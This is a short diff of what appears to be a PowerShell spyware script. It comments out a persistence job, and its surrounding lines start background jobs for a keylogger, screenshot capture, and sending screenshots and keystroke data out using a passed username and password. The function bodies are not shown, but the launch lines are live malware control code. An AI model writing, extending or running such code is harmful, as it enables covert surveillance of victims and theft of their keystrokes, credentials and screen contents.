@@ -380,6 +380,6 @@ if(-Not ([System.IO.File]::Exists($modulenamepath)))
 }
 start-job -InitializationScript $functions -scriptblock {Keypaste $args[0] $args[1]} -ArgumentList @($username,$password)
 start-job -InitializationScript $functions -scriptblock {Keylogger}
-start-job -InitializationScript $functions -scriptblock {MaintainPersistence}
+#start-job -InitializationScript $functions -scriptblock {MaintainPersistence}
 start-job -InitializationScript $functions -scriptblock {Screenshot}
 start-job -InitializationScript $functions -scriptblock {SendScreenshots $args[0] $args[1]} -ArgumentList @($username,$password)
